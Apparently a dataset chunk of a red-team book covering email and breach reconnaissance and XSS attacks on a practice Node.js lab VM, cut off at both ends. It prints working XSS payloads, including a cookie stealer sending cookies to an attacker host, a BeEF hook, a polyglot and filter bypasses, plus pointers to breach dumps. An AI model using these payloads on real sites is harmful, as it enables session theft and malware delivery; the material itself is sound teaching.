optSimplyEmail\n./SimplyEmail.py -all -v -e cyberspacekittens.com\nfirefox cyberspacekittens.com<date_time>/Email_List.html\nThis may take a long time to run as it checks Bing, Yahoo, Google, Ask Search,\nPGP Repos, files, and much more. This may also make your network look like a\nbot to search engines and may require captchas if you produce too many search\nrequests.\nRun this against your company. Do you see any email addresses that you\nrecognize? These might be the first email addresses that could be targeted in a\nlarge scale campaign.\nPast Breaches\nOne of the best ways to get email accounts is to continually monitor and capture\npast breaches. I don't want to link directly to the breaches files, but I will\nreference some of the ones that I have found useful:\n1.4 Billion Password Leak 2017:\nhttps://thehackernews.com/2017/12/data-breach-password-list.html\nAdobe Breach from 2013:\nhttps://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-\npassword-disaster-adobes-giant-sized-cryptographic-blunder/\nPastebin Dumps: http://psbdmp.ws/\nExploit.In Dump\nPastebin Google Dork: site:pastebin.com\nintext:cyberspacekittens.com\nAdditional Open Source Resources\nI didn't know exactly where to put these resources, but I wanted to provide a\ngreat collection of other resources used for Red Team style campaigns. This can\nhelp identify people, locations, domain information, social media, image\nanalysis, and more.\nCollection of OSINT Links:\nhttps://github.com/IVMachiavelli/OSINT_Team_Links\nOSINT Framework: http://osintframework.com/\nConclusion\nIn this chapter we went over all the different reconnaissance tactics and tools of\nthe trade. This is just a start as many of these techniques are manual and require\na fair amount of time to execute. It is up to you to take this to the next level,\nautomate all these tools, and make the recon fast and efficient.",
    "question": "What are the key tools and techniques used by Red Teams for reconnaissance and scanning of a victim's infrastructure, including both internal and external networks, cloud environments, and web applications?",
    "summary": "The text discusses various tools and techniques used by Red Teams for reconnaissance, including external and internal scanning with tools like Nmap, Masscan, and Recon-NG. It emphasizes the importance of monitoring environments for vulnerabilities and using resources like Shodan and Censys to gather information about cloud infrastructure. Additionally, it covers subdomain discovery, S3 bucket enumeration, and email collection methods to identify potential attack vectors."
  },
  {
    "start": 30,
    "end": 43,
    "text": "3 the throw - web application exploitation\nOver the past couple of years, we have seen some critical, externally-facing web\nattacks. Everything from the Apache Struts 2 (although not confirmed for the\nEquifax breach - http://bit.ly/2HokWi0), Panera Bread (http://bit.ly/2qwEMxH),\nand Uber (http://ubr.to/2hIO2tZ). There is no doubt we will continue to see\nmany other severe breaches from public internet facing end-points.\nThe security industry, as a whole, runs in a cyclical pattern. If you look at the\ndifferent layers of the OSI model, the attacks shift to a different layer every other\nyear. In terms of web, back in the early 2000s, there were tons of SQLi and RFI\ntype exploits. However, once companies started to harden their external\nenvironments and began performing external penetration test, we, as attackers,\nmoved to Layer 8 attacks focusing on social engineering (phishing) for our\ninitial entry point. Now, as we see organizations improving their internal\nsecurity with Next Generation Endpoint/Firewall Protection, our focus is shifting\nback onto application exploitation. We have also seen a huge complexity\nincrease in applications, APIs, and languages, which has reopened many old and\neven new vulnerabilities.\nSince this book is geared more toward Red Teaming concepts, we will not go\ntoo deeply into all of the different web vulnerabilities or how to manually exploit\nthem. This won't be your checklist style book. You will be focusing on\nvulnerabilities that Red Teamers and bad guys are seeing in the real world,\nwhich lead to the compromising of PII, IP, networks, and more. For those who\nare looking for the very detailed web methodologies, I always recommend\nstarting with the OWASP Testing Guide (http://bit.ly/2GZbVZd and\nhttps://www.owasp.org/images/1/19/OTGv4.pdf).\nNote, since as many of the attacks from THP2 have not changed, we won't be\nrepeating examples like SQLMap, IDOR attacks, and CSRF vulnerabilities in\nthe following exercises. Instead, we will focus on newer critical ones.\nBug Bounty Programs:\nBefore we start learning how to exploit web applications, let’s talk a little about\nbug bounty programs. The most common question we get is, “how can I\ncontinually learn after these trainings?” My best recommendation is to do it\nagainst real, live systems. You can do training labs all day, but without that real-\nlife experience, it is hard to grow.\nOne caveat though: on average, it takes about 3-6 months before you begin to\nconsistently find bugs. Our advice: don’t get frustrated, keep up-to-date with\nother bug bounty hunters, and don’t forget to check out the older programs.\nThe more common bug bounty programs are HackerOne\n(https://www.hackerone.com), BugCrowd (https://bugcrowd.com/programs) and\nSynAck (https://www.synack.com/red-team/). There are plenty of other ones out\nthere as well (https://www.vulnerability-lab.com/list-of-bug-bounty-\nprograms.php). These programs can pay anywhere from Free to $20k+.\nMany of my students find it daunting to start bug hunting. It really requires you\nto just dive in, allot a few hours a day, and focus on understanding how to get\nthat sixth sense to find bugs. Generally, a good place to start is to look at No-\nReward Bug Bounty Programs (as the pros won’t be looking here) or at large\nolder programs like Yahoo. These types of sites tend to have a massive scope\nand lots of legacy servers. As mentioned in prior books, scoping out pentests is\nimportant and bug bounties are no different. Many of the programs specify what\ncan and cannot be done (i.e., no scanning, no automated tools, which domains\ncan be attacked, etc.). Sometimes you get lucky and they allow *.company.com,\nbut other times it might be limited to a single FQDN.\nLet’s look at eBay, for example, as they have a public bug bounty program. On\ntheir bug bounty site (http://pages.ebay.com/securitycenter/Researchers.html),\nthey state guidelines, eligible domains, eligible vulnerabilities, exclusions, how\nto report, and acknowledgements:\nHow you report vulnerabilities to the company is generally just as important as\nthe finding itself. You want to make sure you provide the company with as\nmuch detail as possible. This would include the type of vulnerability,\nseverity/criticality, what steps you took to exploit the vulnerability, screenshots,\nand even a working proof of concept. If you need help creating consistent\nreports, take a look at this report generation form:\nhttps://buer.haus/breport/index.php.\nHaving run my own programs before, one thing to note about exploiting\nvulnerabilities for bug bounty programs is that I have seen a few cases where\nresearchers got carried away and went past validating the vulnerability. Some\nexamples include dumping a whole database after finding an SQL injection,\ndefacing a page with something they thought was funny after a subdomain\ntakeover, and even laterally moving within a production environment after an\ninitial remote code execution vulnerability. These cases could lead to legal\ntrouble and to potentially having the Feds at your door. So use your best\njudgement, check the scope of the program, and remember that if it feels illegal,\nit probably is.\nWeb Attacks Introduction - Cyber Space Kittens\nAfter finishing reconnaissance and discovery, you review all the different sites\nyou found. Looking through your results, you don’t see the standard exploitable\nservers/misconfigured applications. There aren’t any Apache Tomcat servers or\nHeartbleed/ShellShock, and it looks like they patched all the Apache Strut issues\nand their CMS applications.\nYour sixth sense intuition kicks into full gear and you start poking around at\ntheir Customer Support System application. Something just doesn’t feel right,\nbut where to start?\nFor all the attacks in the Web Application Exploitation chapter, a custom THP3\nVMWare Virtual Machine is available to repeat all these labs. This virtual\nmachine is freely available here:\nhttp://thehackerplaybook.com/get.php?type=csk-web\nTo set up the demo for the Web Environment (Customer System Support):\nDownload the Custom THP VM from:\nhttp://thehackerplaybook.com/get.php?type=csk-web\nDownload the full list of commands for the labs:\nhttps://github.com/cheetz/THP-\nChatSupportSystem/blog/master/lab.txt\nBit.ly Link: http://bit.ly/2qBDrFo\nBoot up and log into the VM\nWhen the VM is fully booted, it should show you the current IP\naddress of the application. You do not need to log into the VM nor\nis the password provided. It is up to you to break into the\napplication.\nSince this is a web application hosted on your own system, let's make\na hostname record on our attacker Kali system:\nOn our attacker Kali VM, let's edit our host file to point to\nour vulnerable application to reference the application by\nhostname versus by IP:\ngedit etchosts\nAdd the following line with the IP of your vulnerable\napplication:\n[IP Address of Vuln App] chat\nNow, go to your browser in Kali and go to\nhttp://chat:3000/. If everything worked, you should be\nable to see the NodeJS Custom Vuln Application.\nThe commands and attacks for the web section can be extremely long and\ncomplicated. To make it easy, I’ve included all the commands you’ll need for\neach lab here:\nhttps://github.com/cheetz/THP-ChatSupportSystem/blog/master/lab.txt\nThe Red Team Web Application Attacks\nThe first two books focused on how to efficiently and effectively test Web\nApplications – this time will be a little different. We are going to skip many of\nthe basic attacks and move into attacks that are used in the real world.\nSince this is more of a practical book, we won’t go into all of the detailed\ntechnicalities of web application testing. However, this doesn’t mean that these\ndetails should be ignored. A great resource for web application testing\ninformation is Open Web Application Security Project, or OWASP. OWASP\nfocuses on developing and educating users on application security. Every few\nyears, OWASP compiles a list of the most common issues and publishes them to\nthe public - http://bit.ly/2HAhoGR. A more in-depth testing guideline is located\nhere: http://bit.ly/2GZbVZd. This document will walk you through the types of\nvulnerabilities to look for, the risks, and how to exploit them. This is a great\nchecklist document: http://bit.ly/2qyA9m1.\nAs many of my readers are trying to break into the security field, I wanted to\nquickly mention one thing: if you are going for a penetration testing job, it is\nimperative to know, at a minimum, the OWASP Top 10 backwards and\nforwards. You should not only know what they are, but also have good\nexamples for each one in terms of the types of risks they bring and how to check\nfor them. Now, let's get back to compromising CSK.\nChat Support Systems Lab\nThe Chat Support System lab that will be attacked was built to be interactive and\nhighlight both new and old vulnerabilities. As you will see, for many of the\nfollowing labs, we provide a custom VM with a version of the Chat Support\nSystem.\nThe application itself was written in Node.js. Why Node? It is one of the fastest\ngrowing applications that we see as penetration testers. Since a lot of developers\nseem to really like Node, I felt it was important for you to understand the\nsecurity implications of running JavaScript as backend code.\nWhat is Node?\n“Node.js® is a JavaScript runtime built on Chrome's V8 JavaScript engine.\nNode.js uses an event-driven, non-blocking I/O model that makes it lightweight\nand efficient.” [https://nodejs.org/en/] Node.js' package ecosystem, NPM, is the\nlargest ecosystem of open source libraries in the world.\nAt a very basic level, Node.js allows you to run JavaScript outside of a browser.\nDue to the fact that Node.js is lean, fast, and cross-platform, it can greatly\nsimplify a project by unifying the stack. Although Node.js is not a web server, it\nallows a server (something you can program in JavaScript) to exist in an\nenvironment outside of the actual Web Client.\nBenefits:\nVery fast\nSingle-threaded JavaScript environment which is capable of acting as\na standalone web application server\nNode.js is not a protocol; it is a web server written in JavaScript\nThe NPM registry hosts almost half a million packages of free,\nreusable Node.js code, which makes it the largest software registry in\nthe world\nWith Node.js becoming so popular in the past couple years, it is very important\nfor penetration testers/Red Teamers to understand what to look for and how to\nattack these applications. For example, a researcher identified that weak NPM\ncredentials gave him edit/publish access to 13% of NPM packages. Through\ndependency chains, an estimated 52% of NPM packages could have been\nvulnerable. [https://www.bleepingcomputer.com/news/security/52-percent-of-\nall-javascript-npm-packages-could-have-been-hacked-via-weak-credentials/]\nIn the following examples, our labs will be using Node.js as the foundation of\nour applications, which will utilize the Express framework\n(https://expressjs.com/) for our web server. We will then add the Pug\n(https://pugjs.org/) template engine to our Express framework. This is similar to\nwhat we are now commonly seeing in newer-developed applications.\nExpress is a minimalistic web framework for Node.js. Express provides a robust\nset of features for web and mobile applications so you don't have to do a lot of\nwork. With modules called Middlewares, you can add third party authentication\nor services like Facebook Auth or Stripe Payment processing.\nPug, formally known as Jade, is a server-side templating engine that you can\n(but do not have to) use with Express. Jade is for programmatically generating\nthe HTML on the server and sending it to the client.\nLet's attack CSK and boot up the Chat Support System Virtual Machine.\nCyber Space Kittens: Chat Support Systems\nYou stumble across the externally-facing Cyber Space Kittens chat support\nsystem. As you slowly sift through all the pages and understand the underlying\nsystem, you look for weaknesses in the application. You need to find your first\nentry point into the server so that you can pivot into the production\nenvironment.\nYou first run through all of your vulnerability scanner and web application\nscanner reports, but come up empty-handed. It looks like this company regularly\nruns the common vuln scanners and has patched most of its issues. The golden\negg findings now rely on coding issues, misconfigurations, and logic flaws. You\nalso notice that this application is running NodeJS, a recently popular language.\nSetting Up Your Web Application Hacking Machine\nAlthough there are no perfect recipes for Red Teaming Web Applications, some\nof the basic tools you will need include:\nArming yourself with browsers. Many browsers act very differently\nespecially with complex XSS evasion:\nFirefox (my favorite for testing)\nChrome\nSafari\nWappalyzer: a cross-platform utility that uncovers the technologies\nused on websites. It detects content management systems,\necommerce platforms, web frameworks, server software, analytics\ntools and many more.\nhttps://wappalyzer.com/\nBuiltWith: a web site profiler tool. Upon looking up a page,\nBuiltWith returns all the technologies it can find on the page.\nBuiltWith’s goal is to help developers, researchers and designers find\nout what technologies pages are using, which may help them to\ndecide what technologies to implement themselves.\nhttps://builtwith.com/\nRetire.JS: scan a web app for use of vulnerable JavaScript libraries.\nThe goal of Retire.js is to help you detect use of a version with\nknown vulnerabilities.\nhttps://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?\nhl=en\nBurp Suite (~$350): although this commercial tool is a bit expensive,\nit is definitely worth every penny and a staple for penetration\ntesters/Red Teamers. Its benefits come from the add-ons, modular\ndesign, and user development base. If you can't afford Burp,\nOWASP ZAP (which is free) is an excellent replacement.\nAnalyzing a Web Application\nBefore we do any type of scanning, it is important to try to understand the\nunderlying code and infrastructure. How can we tell what is running the\nbackend? We can use Wappalyzer, BuiltWith, or just Google Chrome inspect.\nIn the images below, when loading up the Chat application, we can see that the\nHTTP headers have an X-Powered By: Express. We can also see with\nWappalyzer that the application is using Express and Node.js.\nUnderstanding the application before blindly attacking a site can help provide\nyou with a much better approach. This could also help with targeted sites that\nmight have WAFs, allowing you to do a more ninja attack.\nWeb Discovery\nIn the previous books, we went into more detail on how to use Burp Suite and\nhow to penetration test a site. We are going to skip over a lot of the setup basics\nand focus more on attacking the site.\nWe are going to assume, at this point, that you have Burp Suite all set up (free or\npaid) and you are on the THP Kali image. Once we have an understanding of\nthe underlying system, we need to identify all the endpoints. We still need to\nrun the same discovery tools as we did in the past.\nBurp Suite (https://portswigger.net/burp)\nSpidering: In both the free and paid versions, Burp Suite\nhas a great Spidering tool.\nContent Discovery: If you are using the paid version of\nBurp Suite, one of the favorite discovery tools is under\nEngagement tools, Discover Content. This is a smart and\nefficient discovery tool that looks for directories and files.\nYou can specify several different configurations for the\nscan.\nActive Scan: Runs automated vulnerability scanning on all\nparameters and tests for multiple web vulnerabilities.\nOWASP ZAP (http://bit.ly/2IVNaO2)\nSimilar to Burp, but completely open source and free. Has\nsimilar discover and active scan features.\nDirbuster\nAn old tool that has been around forever to discover\nfiles/folders of a web application, but still gets the job\ndone.\nTarget URL: http://chat:3000\nWord List:\nusrshare/wordlists/dirbuster/directory-list-2.3-\nsmall.txt\nGoBuster (https://github.com/OJ/gobuster)\nVery lightweight, fast directory and subdomain bruteforce\ntool\ngobuster -u http://chat:3000 -w\noptSecLists/Discovery/Web-Content/raft-small-\ndirectories.txt -s 200,301,307 -t 20\nYour wordlists are very important. One of my favorite wordlists to use is an old\none called raft, which is a collection of many open source projects. You can find\nthese and other valuable wordlists here:\nhttps://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content\n(which is already included in your THP Kali image).\nNow that we are done with the overview, let’s get into some attacks. From a\nRed Team perspective, we are looking for vulnerabilities we can actively attack\nand that provide the most bang for our buck. If we were doing an audit or a\npenetration test, we might report vulnerabilities like SSL issues, default Apache\npages, or non-exploitable vulnerabilities from vulnerability scanner. But, on our\nRed Team engagements, we can completely ignore those and focus on attacks\nthat get us advanced access, shells, or dump PII.\nCross-Site Scripting XSS\nAt this point, we have all seen and dealt with Cross-Site Scripting (XSS).\nTesting every variable on a website with the traditional XSS attack:\n<script>alert(1)</script>, might be great for bug bounties, but can we do more?\nWhat tools and methods can we use to better utilize these attacks?\nSo, we all know that XSS attacks are client-side attacks that allow an attacker to\ncraft a specific web request to inject malicious code into a response. This could\ngenerally be fixed with proper input validation on the client and server-side, but\nit is never that easy. Why, you ask? It is due to a multitude of reasons.\nEverything from poor coding, to not understanding frameworks, and sometimes\napplications just get too complex and it becomes hard to understand where an\ninput goes.\nBecause the alert boxes don't really do any real harm, let's start with some of the\nbasic types of XSS attacks:\nCookie Stealing XSS: <script>document.write('<img\nsrc=\"http://<Your IP>/Stealer.php?cookie=' %2B document.cookie\n%2B '\" >');<script>\nForcing the Download of a File: <script>var link =\ndocument.createElement('a'); link.href =\n'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';\nlink.download = ''; document.body.appendChild(link); link.click();\n</script>\nRedirecting User: <script>window.location =\n\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\";</script>\nOther Scripts to Enable Key Loggers, Take Pictures, and More\nhttp://www.xss-payloads.com/payloads-list.html?\nc#category=capture\nObfuscated/Polyglot XSS Payloads\nIn today's world, the standard XSS payload still works pretty often, but we do\ncome across applications that block certain characters or have WAFs in front of\nthe application. Two good resources to help you start crafting obfuscated XSS\npayload attacks:\nhttps://github.com/foospidy/payloads/tree/master/other/xss\nhttps://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\nSometimes during an assessment, you might run into simple XSS filters that\nlook for strings like <script>. Obfuscating the XSS payload is one option, but it\nis also important to note that not all JavaScript payloads require the open and\nclose <script> tags. There are some HTML Event Attributes that execute\nJavaScript when triggered\n(https://www.w3schools.com/tags/ref_eventattributes.asp). This means any rule\nthat looks specifically for Script tags will be useless. For example, these HTML\nEvent Attributes that execute JavaScript being outside a <script> tag:\n<b onmouseover=alert('XSS')>Click Me!</b>\n<svg onload=alert(1)>\n<body onload=\"alert('XSS')\">\n<img src=\"http://test.cyberspacekittens.com\"\nonerror=alert(document.cookie);>\nYou can try each of these HTML entity attacks on the CSK application by going\nto the application: http://chat:3000/ (remember to modify your etchost file to\npoint chat to your VM IP). Once you are there, register an account, log into the\napplication, and go to the chat functionality (http://chat:3000/chatchannel/1).\nTry the different entity attacks and obfuscated payloads.\nOther great resources for XSS:\nThe first is Mind Map made by @jackmasa. This is a great\ndocument that breaks down different XSS payloads based on where\nyour input is served. Although no longer on JackMasa GitHub page,\na copy exists here: http://bit.ly/2qvnLEq.\nAnother great resource that discusses which browsers are vulnerable\nto which XSS payloads is: https://html5sec.org/.\n*JackMasa XSS Mind Map\nAs you can see, it is sometimes annoying to try to find every XSS on an\napplication. This is because vulnerable parameters are affected by code features,\ndifferent types of HTML tags, types of applications, and different types of\nfiltering. Trying to find that initial XSS pop-up can take a long time. What if\nwe could try and chain multiple payloads into a single request?\nThis last type of payload is called a Polyglot. A Polyglot payload takes many\ndifferent types of payload/obfuscation techniques and compiles them into one\nattack. This is great for automated scripts to look for XSS, bug bounty hunters\nwith limited time, or just a quick way to find input validation issues.\nSo, instead of the normal <script>alert(1)</script>, we can build a Polyglot like\nthis (http://bit.ly/2GXxqxH):\n/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert()\n)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--\n!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\nIf you look at the payload above, the attack tries to break out of comments, ticks\nand slashes; perform an onclick XSS; close multiple tags; and lastly tries an\nonload XSS. These types of attacks make Polyglots extremely effective and\nefficient at identifying XSS. You can read more about these Polyglot XSSs\nhere: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-\nPolyglot\nIf you want to test and play around with the different polyglots, you can start\nhere on the vulnerable XSS pages (http://chat:3000/xss) or throughout the Chat\nApplication.\nBeEF\nBrowser Exploitation Framework (http://beefproject.com/) or BeEF, takes XSS\nto another level. This tool injects a JavaScript payload onto the victim’s\nbrowser, which infects the user’s system. This creates a C2 channel on the\nvictim’s browser for JavaScript post-exploitation.\nFrom a Red Team perspective, BeEF is a great tool to use on campaigns, track\nusers, capture credentials, perform clickjacking, attack with tabnapping and\nmore. If not used during an attack, BeEF is a great tool to demonstrate the\npower of an XSS vulnerability. This could assist in more complicated attacks as\nwell, which we will discuss later in the book under Blind XSS.\nBeEF is broken down into two parts: one is the server and the other is the attack\npayload. To start the server:\nStart BeEF on Your Attacker Kali Host\nFrom a Terminal\nbeef-xss\nAuthenticate with beef:beef\nView http://127.0.0.1:3000/hook.js\nFull Payload Hook File:\n<script src=\"http://<Your IP>:3000/hook.js\"></script>\nViewing your hook.js file located on http://127.0.0.1:3000/hook.js, you should\nsee something that resembles a long-obfuscated JavaScript file. This is the client\npayload to connect your victim back to the command and control server.\nOnce you have identified an XSS on your target application, instead of the\noriginal alert(1) style payload, you would modify the <script src=\"http://<Your\nIP>:3000/hook.js\"></script> payload to exploit the vulnerability. Once your\nvictim falls for this XSS trap, it will cause their browser to connect back to you\nand be a part of your Zombie network.\nWhat types of post exploitation attacks does BeEF support? Once your victim\nis under your control, you really can do anything that JavaScript can do. You\ncan turn on their camera via HTLM5 and take a picture of your victim, you can\npush overlays on their screen to capture credentials, or you can redirect them to a\nmalicious site to execute malware.\nHere is a quick demonstration of BeEF's ability to cause massive issues from an\nXSS attack:\nFirst, make sure your BeEF server is running on your attacker machine. On our\nvulnerable Chat Support System's application, you can go to http://chat:3000/xss\nand inside the Exercise 2 field and put in your payload:\n<script src=\"http://127.0.0.1:3000/hook.js\"></script>\nOnce your victim is connected to your Zombie network, you have full control of\ntheir browser. You can do all sorts of attacks based on their device, browser,\nand enabled features. A great way to demonstrate XSS impact with social\nengineering tactics is by pushing malware to their machine via a Flash Update\nprompt.\nOnce executed, a pop-up will be presented on the victim's machine, forcing them\nto install an update, which will contain additional malware.\nI recommend spending some time playing around with all the BeEf post\nexploitation modules and understanding the power of JavaScript. Since we\ncontrol the browser, we have to figure out how to use this in terms of Red Team\ncampaigns. What else might you want to do once you have infected a victim\nfrom an XSS? We will discuss this in the XSS to Compromise section.\nBlind XSS\nBlind XSS is rarely discussed as it is a patient person's game. What is Blind\nXSS? As the name of the attack suggests, it is when an execution of a stored\nXSS payload is not visible to the attacker/user, but only visible to an\nadministrator or backend employee. Although this attack could be very\ndetrimental due to its ability to attack backend users, it is often missed.\nFor example, let's assume an application has a \"contact us\" page that allows a\nuser to supply contact information to the administrator in order to be contacted\nlater. Since the results of that data are only viewable by an administrator\nmanually and not the requesting user and if the application was vulnerable to\nXSS, then the attacker would not immediately see their \"alert(1)\" attack. In\nthese cases, we can use XSSHunter (https://xsshunter.com) to help us validate\nthe Blind XSS.\nHow XSSHunter works is that when our JavaScript payload executes, it will take\na screenshot of the victim's screen (the current page they are viewing) and send\nthat data back to the XSSHunter's site. When this happens, XSSHunter will send\nan alert that our payload executed and provide us with all the detailed\ninformation. We can now go back to create a very malicious payload and replay\nour attack.\nXSS Hunter:\nDisable any Proxies (i.e. Burp Suite)\nCreate account at https://xsshunter.com\nLogin at https://xsshunter.com/app\nGo to Payloads to get your Payload\nModify the payload to fit your attack or build a Polyglot with it\nCheck XSS hunter to see the payload execution\nDOM Based XSS\nThe understanding of reflective and stored XSS is relatively straight forward.\nAs we already know, the server doesn’t provide adequate input/output validation\nto the user/database and our malicious script code is presented back to user in\nsource code. However, in DOM based XSS, it is slightly different, which many\ncause some common misunderstandings. Therefore, let’s take some time to focus\non DOM based XSS.\nDocument Object Model (DOM) based XSS is made possible when an attacker\ncan manipulate the web application’s client-side scripts. If an attacker can inject\nmalicious code into the DOM and have it read by the client’s browser, the\npayload can be executed when the data is read back from the DOM.\nWhat exactly is the DOM? The Document Object Model (DOM) is a\nrepresentation of HTML properties. Since your browser doesn’t understand\nHTML, it uses an interpreter that transforms HTML into a model called the\nDOM.\nLet's walk through this on the Chat Support Site. Looking at the vulnerable web\napplication, you should be able to see that the chat site is vulnerable to XSS:\nCreate an account\nLogin\nGo to Chat\nTry <script>alert(1)</script> and then try some crazy XSS attacks!\nIn our example, we have Node.js on the server side, socket.io (a library for\nNode.js) setting up web sockets between the user and server, client-side\nJavaScript, and our malicious msg.msgText JavaScript. As you can see below\nand in source code for the page, you will not see your \"alert\" payload directly\nreferenced as you would in a standard reflective/stored XSS. In this case, the\nonly reference we would receive that indicates where our payload might be\ncalled, is from the msg.name reference. This does sometimes make it hard to\nfigure out where our XSS payload is executed or if there is a need to break out of\nany HTML tags.\nAdvanced XSS in NodeJS\nOne of the big reasons why XSS keeps coming back is that it is much harder\nthan just filtering for tags or certain characters. XSS gets really difficult to\ndefend when the payloads are specific to a certain language or framework. Since\nevery language has its oddities when it comes to vulnerabilities, it will be no\ndifferent with NodeJS.\nIn the Advanced XSS section, you are going to walk through a few examples\nwhere language-specific XSS vulnerabilities come into play. Our NodeJS web\napplication will be using one of the more common web stacks and\nconfigurations. This implementation includes the Express Framework\n(https://expressjs.com/) with the Pug template engine (https://pugjs.org/). It is\nimportant to note that by default, Express really has no built-in XSS prevention\nunless rendering through the template engine. When a template engine like Pub\nis used, there are two common ways of finding XSS vulnerabilities: (1) through\nstring interpolation, and (2) buffered code.\nTemplate engines have a concept of string interpolation, which is a fancy way of\nsaying “placeholders for string variables.” For example, let's assign a string to a\nvariable in the Pug template format:\n- var title = \"This is the HTML Title\"\n- var THP = \"Hack the Planet\"\nh1 #{title}\np The Hacker Playbook will teach you how to #{THP}\nNotice that the #{THP} is a placeholder for the variable that was assigned prior\nto THP. We commonly see these templates being used in email distribution\nmessages. Have you ever received an email from an automated system that had\nDear ${first_name}… instead of your actual first name? This is exactly what\ntemplating engines are used for.\nWhen the template code above is rendered into HTML, it will look like:\n<h1>This is the HTML Title</h1>\n<p>The Hacker Playbook will teach you how to Hack the Planet</p>\nLuckily, in this case, we are using the \"#{}\" string interpolation, which is the\nescaped version of Pug interpolation. As you can see, by using a template, we\ncan create very reusable code and make the templates very lightweight.\nPug supports both escaped and unescaped string interpolation. What's the\ndifference between escaped and unescaped? Well, using escaped string\ninterpolation will HTML-encode characters like <,>,', and \". This will assist in\nproviding input validation back to the user. If a developer uses an unescaped\nstring interpolation, this will generally lead to XSS vulnerabilities.\nFurthermore, string interpolation (or variable interpolation, variable substitution,\nor variable expansion) is the process of evaluating a string literal containing one\nor more placeholders, yielding a result in which the placeholders are replaced\nwith their corresponding values.\n[https://en.wikipedia.org/wiki/String_interpolation]\nIn Pug escaped and unescaped string interpolation\n(https://pugjs.org/language/interpolation.html):\n!{} – Unescaped string interpolation\n#{} – Escaped string interpolation *Although this is\nescaped, it could still be vulnerable to XSS if directly\npassed through JavaScript\nIn JavaScript, unescaped buffer code starts with \"!=\". Anything after\nthe \"!=\" will automatically execute as JavaScript.\n[https://pugjs.org/language/code.html#unescaped-buffered-code]\nLastly, anytime raw HTML is allowed to be inserted, there is the\npotential for XSS.\nIn the real world, we have seen many cases that were vulnerable to XSS, based\non the above notation where the developer forgets which context they are in and\nfrom where the input is being passed. Let’s take a look at a few of these\nexamples on our vulnerable Chat Support System Application. Go to the\nfollowing URL on the VM: http://chat:3000/xss. We will walk through each one\nof these exercises to understand NodeJS/Pug XSS.\nExercise 1 (http://chat:3000/xss)\nIn this example, we have escaped string interpolation into a paragraph tag. This\nis not exploitable because we are using the correct escaped string interpolation\nnotation within the HTML paragraph context.\nGo to http://chat:3000/xss and click Exercise #1\nThe Pug Template Source Code:\np No results found for #{name1}\nTry entering and submitting the following payload:\n<script>alert(1)</script>\nClick back on Exercise #1 and review the No Results Output\nView the HTML Response (view the Source Code of the page):\n&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;\nAfter hitting submit, look at the page source code (ctrl+u) and search for the\nword \"alert\". You are going to see that the special characters from our payload\nare converted into HTML entities. The script tags are still visible on our site\nthrough our browser, but are not rendered into JavaScript. This use of string\ninterpolation is correct and there is really no way to break out of this scenario to\nfind an XSS. A+ work here! Let's look at some poor implementations.\nExercise 2\nIn this example, we have unescaped string interpolation denoted by the !{} in a\nparagraph tag. This is vulnerable to XSS by design. Any basic XSS payload\nwill trigger this, such as: <script>alert(1)</script>\nGo to Exercise #2\nThe Pug Template Source Code:\np No results found for !{name2}\nTry entering the payload:\n<script>alert(1)</script>\nResponse:\n<script>alert(1)</script>\nAfter hitting submit, we should see our pop-up. You can verify by\nlooking at the page source code and searching for \"alert\".\nSo, using unescaped string interpolation (!{name2}) where user input is\nsubmitted, leads to a lot of trouble. This is a poor practice and should never be\nused for user-submitted data. Any JavaScript we enter will be executed on the\nvictim's browser.\nExercise 3\nIn this example, we have escaped string interpolation in dynamic inline\nJavaScript. This means we are protected since it's escaped, right? Not\nnecessarily. This example is vulnerable because of the code context we are in.\nWe are going to see that in the Pug Template, prior to our escaped interpolation,\nwe are actually inside a script tag. So, any JavaScript, although escaped, will\nautomatically execute. Even better, because we are in a Script tag, we do not\nneed to use the <script> tag as part of our payload. We can use straight\nJavaScript, such as: alert(1):\nGo to Example #3\nPug Template Source Code:\nscript.\nvar user3 = #{name3};\np No results found for #{name3}\nThis template will translate in HTML like the following:\n<script>\n<p>No results found for [escaped user input]</p>\n</script>\nTry entering the payload:\n1;alert(1);\nAfter hitting submit, we should see our pop-up. You can verify by\nlooking at the page source code and searching for \"alert\".\nAlthough, a small change, the proper way to write this would have been to add\nquotes around the interpolation:\nPug Template Source Code:\nscript.\nvar user3=\"#{name3}\"\nExercise 4\nIn this example, we have Pug unescaped buffered code\n(https://pugjs.org/language/code.html) denoted by the != which is vulnerable to\nXSS by design, since there is no escaping. So in this scenario, we can use the\nsimple \"<script>alert(1)</script>\" style attack against the input field.\nPug Template Source Code:\np != 'No results found for '+name4\nTry entering the payload:\n<script>alert(1)</script>\nAfter hitting submit, we should see our pop-up. You can verify by\nlooking at the page source code and searching for \"alert\".\nExercise 5\nLet's say we get to an application that is using both escaped string interpolation\nand some type of filtering. In our following exercise, we have minimal blacklist\nfiltering script being performed within the NodeJS server dropping characters\nlike \"<\", \">\" and \"alert\". But, again they made the mistake of putting our\nescaped string interpolation within a script tag. If we can get JavaScript in there,\nwe could have an XSS:\nGo to Example #5\nPug Template Source Code:\nname5 = req.query.name5.replace(/[;'\"<>=]|alert/g,\"\")\nscript.\nvar user3 = #{name5};\nTry entering the payload:\nYou can try the alert(1), but that doesn't work due to the\nfilter. You could also try things like <script>alert(1)\n</script>, but escaped code and the filter will catch us.\nWhat could we do if we really wanted to get our alert(1)\npayload?\nWe need to figure out how to bypass the filter to insert raw\nJavaScript. Remember that JavaScript is extremely powerful and has\nlots of functionality. We can abuse this functionality to come up\nwith some creative payloads. One way to bypass these filters is by\nutilizing esoteric JavaScript notation. This can be created through a\nsite called: http://www.jsfuck.com/. As you can see below, by using\nbrackets, parentheses, plus symbols, and exclamation marks, we can\nrecreate alert(1).\nJSF*ck 